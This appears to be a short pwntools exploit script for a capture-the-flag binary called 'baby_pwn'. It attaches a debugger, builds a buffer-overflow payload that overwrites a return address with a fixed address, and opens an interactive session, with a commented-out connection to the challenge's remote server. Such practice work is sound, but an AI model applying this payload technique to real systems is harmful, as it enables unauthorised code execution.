from pwn import *
io=process("./baby_pwn")
gdb.attach(io,"b*0x0040105f")
#io=remote("babypwn.zajebistyc.tf",31001)
payload=p64(0x401059)*2
payload="dddddddd"+p64(0x400400)
io.send(payload)

io.interactive()
